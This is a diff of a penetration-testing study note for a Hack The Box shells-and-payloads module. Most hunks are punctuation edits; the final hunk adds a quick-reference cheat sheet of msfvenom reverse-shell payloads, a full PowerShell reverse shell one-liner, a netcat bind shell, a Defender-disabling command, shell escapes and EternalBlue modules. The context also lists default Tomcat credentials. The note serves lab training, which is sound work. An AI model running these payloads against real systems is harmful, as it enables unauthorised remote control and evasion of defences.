@@ -2,7 +2,7 @@
 
 #ShellsAndPayloads #BindShell #ReverseShell #Webshell #Laudanum #Antak #PHP #ASPX #Meterpreter #msfvenom #EternalBlue #Tomcat #WAR #ContentTypeBypass #HTBSupplementary
 
-**HTB Shells & Payloads module** — supplementary to Offsec shell and payload content scattered across Client-Side Attacks, Antivirus Evasion, Common Web Application Attacks, and the Shells & Payloads Command Appendix. This note captures what the Offsec modules don't cover as standalone sections: bind shell FIFO pattern, full PowerShell reverse shell one-liner, Laudanum/Antak ASPX webshell workflow, Tomcat WAR file delivery, PHP Content-Type bypass, and the multi-host live engagement chain.
+**HTB Shells & Payloads module**, supplementary to Offsec shell and payload content scattered across Client-Side Attacks, Antivirus Evasion, Common Web Application Attacks, and the Shells & Payloads Command Appendix. This note captures what the Offsec modules don't cover as standalone sections: bind shell FIFO pattern, full PowerShell reverse shell one-liner, Laudanum/Antak ASPX webshell workflow, Tomcat WAR file delivery, PHP Content-Type bypass, and the multi-host live engagement chain.
 
 > 🔁 Cross-refs: [[Common Web Application Attacks#9.3.1. Using Executable Files|9.3.1 file upload attacks]], [[Antivirus Evasion#15.3.2. PowerShell In-Memory Injection|15.3.2 PS injection]], [[Client-Side Attacks#11.3.3. Staged Payload|11.3.3 download cradle]], [[Shells & Payloads]] (Command Appendix), [[Vulnerability Scanning#7.2.4. Analyzing the Results|MS17-010 in Nessus results]]
 
@@ -17,7 +17,7 @@ A **shell** is a program that exposes OS services through a command-line interfa
 
 Most initial access paths (web shells, file upload RCE, log poisoning) land you a non-interactive shell. The immediate goal is usually to upgrade it to interactive.
 
-**PSVersionTable** — check PowerShell version and edition on any host:
+**PSVersionTable**, check PowerShell version and edition on any host:
 ```powershell
 # Launch PowerShell on Linux/Kali
 pwsh
@@ -105,7 +105,7 @@ Flags: `-nop` = no profile (faster startup, removes some detection hooks). `-c` 
 # Open PowerShell as Administrator first, then:
 Set-MpPreference -DisableRealtimeMonitoring $true
 ```
-Disables Defender's real-time protection for the current boot. Requires admin privileges. On a real engagement, this is loud — logs to Windows Event Log.
+Disables Defender's real-time protection for the current boot. Requires admin privileges. On a real engagement, this is loud, logs to Windows Event Log.
 
 > 📸 Screenshot: nc listener on Kali receiving the reverse shell callback with PS prompt visible; if applicable, the "malicious content blocked" error and the Defender disable step
 
@@ -119,7 +119,7 @@ Disables Defender's real-time protection for the current boot. Requires admin pr
 
 ## SP.4. Automating Payloads with Metasploit
 
-**MSF exploit/windows/smb/psexec** — authenticate with known credentials and get a Meterpreter shell via PSExec:
+**MSF exploit/windows/smb/psexec**, authenticate with known credentials and get a Meterpreter shell via PSExec:
 ```bash
 msfconsole -q
 use exploit/windows/smb/psexec
@@ -162,7 +162,7 @@ cat C:/flag.txt
 | `.war` | Web Application Archive | Java/Tomcat — see SP.9 |
 | `.hta` | HTML Application | MSHTA.exe executes directly |
 
-**MS17-010 / EternalBlue (CVE-2017-0144)** — Shadow Brokers NSA leak, 2017. Targets the Windows SMB implementation. Covered in Vulnerability Scanning related boxes. MSF module:
+**MS17-010 / EternalBlue (CVE-2017-0144)**. Shadow Brokers NSA leak, 2017. Targets the Windows SMB implementation. Covered in Vulnerability Scanning related boxes. MSF module:
 
 ```bash
 msfconsole -q
@@ -185,7 +185,7 @@ Gives `NT AUTHORITY\SYSTEM` directly. No credentials needed. Affects Windows XP 
 
 ## SP.6. Infiltrating Unix/Linux
 
-**rConfig 3.9.6 RCE** (CVE-2019-19585 / EDB-47433) — authenticated file upload leading to RCE via a PHP reverse shell upload in the Vendors section.
+**rConfig 3.9.6 RCE** (CVE-2019-19585 / EDB-47433), authenticated file upload leading to RCE via a PHP reverse shell upload in the Vendors section.
 
 MSF module: `exploit/linux/http/rconfig_vendors_auth_file_upload_rce`
 
@@ -257,7 +257,7 @@ Enter commands in the web form. The current directory is typically `c:\windows\s
 
 > 📸 Screenshot: Laudanum shell.aspx UI showing the command input box and the `dir` output confirming `c:\windows\system32\inetsrv` as the working directory
 
-> 🔍 Worth remembering generally: the IIS working directory for most web app pools is `c:\windows\system32\inetsrv`. This isn't the web root — navigate explicitly to `C:\inetpub\wwwroot\` or whatever the app root is to find web files.
+> 🔍 Worth remembering generally: the IIS working directory for most web app pools is `c:\windows\system32\inetsrv`. This isn't the web root, navigate explicitly to `C:\inetpub\wwwroot\` or whatever the app root is to find web files.
 
 > 🔁 Similar to: [[Common Web Application Attacks#9.3.2. Using Non-Executable Files|9.3.2]] uses `/usr/share/webshells/aspx/cmdasp.aspx` (same idea, different shell). Laudanum is more feature-rich.
 
@@ -387,7 +387,7 @@ ip a | grep "172.16.1."      # or whatever the internal subnet is
 
 > 🔍 Worth remembering generally: Tomcat Manager default credentials worth trying: `tomcat:tomcat`, `admin:admin`, `admin:s3cr3t`, `manager:manager`. On older installs, `tomcat:tomcat` is genuine. HTB often uses `tomcat:Tomcatadm` or similar hinted creds.
 
-> 🔁 Similar to: [[Common Web Application Attacks#9.3.2|9.3.2]] covers IIS file upload execution. Tomcat WAR is the Java/Linux/Windows equivalent — same upload-to-execute pattern, different stack.
+> 🔁 Similar to: [[Common Web Application Attacks#9.3.2|9.3.2]] covers IIS file upload execution. Tomcat WAR is the Java/Linux/Windows equivalent, same upload-to-execute pattern, different stack.
 
 #### Tags: #Tomcat #WAR #msfvenom #JSP #JavaShell #TomcatManager
 
@@ -407,7 +407,7 @@ Internet ──→ Jump Host (172.16.1.5) ──→ Host-1: 172.16.1.11 (shells-
 **Jump host setup:** access via `xfreerdp /v:TARGET /u:htb-student /p:"HTB_@cademy_stdnt!"`. The jump host already has `/etc/hosts` entries mapping vhost names to internal IPs.
 
 **General pattern for all three hosts:**
-1. Nmap from jump host: `nmap -A TARGET_IP` — identify services and OS
+1. Nmap from jump host: `nmap -A TARGET_IP`, identify services and OS
 2. Choose the right exploit/shell path based on findings
 3. Set LHOST to the jump host's internal IP (not Kali's external IP): `ip a | grep "172.16.1"`
 4. Start listener on jump host, trigger exploit, catch shell
@@ -499,7 +499,7 @@ Internet ──→ Jump Host (172.16.1.5) ──→ Host-1: 172.16.1.11 (shells-
 - [x] SP.10. Tomcat WAR file delivery
 - [x] SP.11. Live Engagement multi-host chain
 - [x] SP.12. All Q&A answers
-- All hands-on labs completed — no Offsec VM required (HTB spawnable targets only)
+- All hands-on labs completed, no Offsec VM required (HTB spawnable targets only)
 
 ---
 
@@ -509,3 +509,94 @@ Internet ──→ Jump Host (172.16.1.5) ──→ Host-1: 172.16.1.11 (shells-
 - **[Jerry](https://0xdf.gitlab.io/2019/02/21/htb-jerry.html)** (HTB, Windows, Easy): Apache Tomcat Manager WAR file deployment → SYSTEM. Textbook SP.10 practice.
 - **[Grandpa](https://www.hackthebox.com/machines/grandpa)** (HTB, Windows, Easy): IIS 6.0 WebDAV buffer overflow. Similar "old Windows service → SYSTEM" chain to SP.5.
 - **[Bashed](https://0xdf.gitlab.io/2018/04/29/htb-bashed.html)** (HTB, Linux, Easy): web shell already planted on the server (phpbash) → upgrade to reverse shell. Practice SP.6/SP.9 style thinking.
+
+
+---
+
+## HTB Module Quick Reference
+
+Commands formatted for use with the [[Pre-Engagement Kali Setup]] variable block.
+
+```bash
+# ============================================================
+# LISTENERS
+# ============================================================
+# Netcat listener — rlwrap gives arrow-key history on the caught shell
+rlwrap nc -lvnp $Port
+
+# ============================================================
+# MSFVENOM PAYLOADS
+# ============================================================
+# Linux stageless ELF reverse shell
+msfvenom -p linux/x64/shell_reverse_tcp LHOST=$LocalIP LPORT=$Port -f elf -o www/shell.elf
+
+# Windows stageless EXE reverse shell
+msfvenom -p windows/x64/shell_reverse_tcp LHOST=$LocalIP LPORT=$Port -f exe -o www/shell.exe
+
+# Windows staged Meterpreter EXE
+msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=$LocalIP LPORT=$Port -f exe -o www/meter.exe
+
+# macOS reverse shell
+msfvenom -p osx/x86/shell_reverse_tcp LHOST=$LocalIP LPORT=$Port -f macho -o www/shell.macho
+
+# ASP Meterpreter (old IIS / WebDAV upload)
+msfvenom -p windows/meterpreter/reverse_tcp LHOST=$LocalIP LPORT=$Port -f asp -o www/shell.asp
+
+# JSP reverse shell (Tomcat upload)
+msfvenom -p java/jsp_shell_reverse_tcp LHOST=$LocalIP LPORT=$Port -f raw -o www/shell.jsp
+
+# WAR reverse shell (Tomcat Manager deploy)
+msfvenom -p java/jsp_shell_reverse_tcp LHOST=$LocalIP LPORT=$Port -f war -o www/shell.war
+
+# PHP reverse shell
+msfvenom -p php/reverse_php LHOST=$LocalIP LPORT=$Port -f raw -o www/reverse.php
+
+# ============================================================
+# REVERSE SHELL ONE-LINERS
+# ============================================================
+# PowerShell TCPClient reverse shell (paste on Windows target)
+powershell -nop -c "$client = New-Object System.Net.Sockets.TCPClient('$LocalIP',$Port);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes,0,$bytes.Length)) -ne 0){$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0,$i);$sendback = (iex $data 2>&1 | Out-String);$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()"
+
+# mkfifo bind shell (no outbound needed — connect in from Kali)
+rm -f /tmp/f; mkfifo /tmp/f; cat /tmp/f | /bin/bash -i 2>&1 | nc -l $BoxIP $Port > /tmp/f
+
+# ============================================================
+# SHELL STABILISATION
+# ============================================================
+python3 -c 'import pty; pty.spawn("/bin/bash")'   # spawn PTY
+python -c 'import pty; pty.spawn("/bin/sh")'       # python2 fallback
+awk 'BEGIN {system("/bin/sh")}'                     # awk escape
+find . -exec /bin/sh \; -quit                       # find escape
+vim -c ':!/bin/sh'                                  # vim jail escape
+
+# ============================================================
+# WINDOWS RECON
+# ============================================================
+# Show logged-in users and session type
+query user
+
+# Env variables (includes shell type hint)
+env
+set
+
+# Disable Defender real-time monitoring (requires admin)
+Set-MpPreference -DisableRealtimeMonitoring $true
+
+# ============================================================
+# METASPLOIT QUICK LAUNCH
+# ============================================================
+use exploit/multi/handler   # catch any reverse shell
+# set PAYLOAD <match msfvenom payload>
+# set LHOST $LocalIP
+# set LPORT $Port
+# run -j   # run as background job
+
+use exploit/windows/smb/ms17_010_psexec   # EternalBlue
+use auxiliary/scanner/smb/smb_ms17_010    # check before exploiting
+
+# ============================================================
+# WEBSHELL LOCATIONS (Kali)
+# ============================================================
+# /usr/share/webshells/laudanum        — Laudanum (PHP/ASPX/JSP etc)
+# /usr/share/nishang/Antak-WebShell    — Antak ASPX interactive shell
+```
